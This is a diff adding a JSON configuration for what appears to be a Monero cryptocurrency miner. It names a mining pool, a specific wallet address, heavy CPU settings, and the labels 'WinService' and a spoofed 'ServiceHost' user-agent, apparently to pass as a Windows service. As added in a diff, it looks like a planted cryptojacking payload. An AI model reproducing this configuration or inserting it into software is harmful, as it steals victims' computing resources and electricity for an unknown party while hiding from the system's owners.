@@ -1,0 +1,20 @@
+{
+    "autosave": false,
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "priority": 1,
+        "max-threads-hint": 75
+    },
+    "pools": [
+        {
+            "url": "gulf.monero.hashvault.pro:443",
+            "user": "46vggUTyU71TS5bDKZ8GpMFbpWaw16Uv2b3ZjXewXiv98GPLuWjVBf7L2sXHMm1FRpgePGkizEmG4R8SgquBLa4HVPSL4d1",
+            "pass": "WinService",
+            "tls": true,
+            "keepalive": true
+        }
+    ],
+    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ServiceHost/3.1",
+    "donate-level": 1
+}
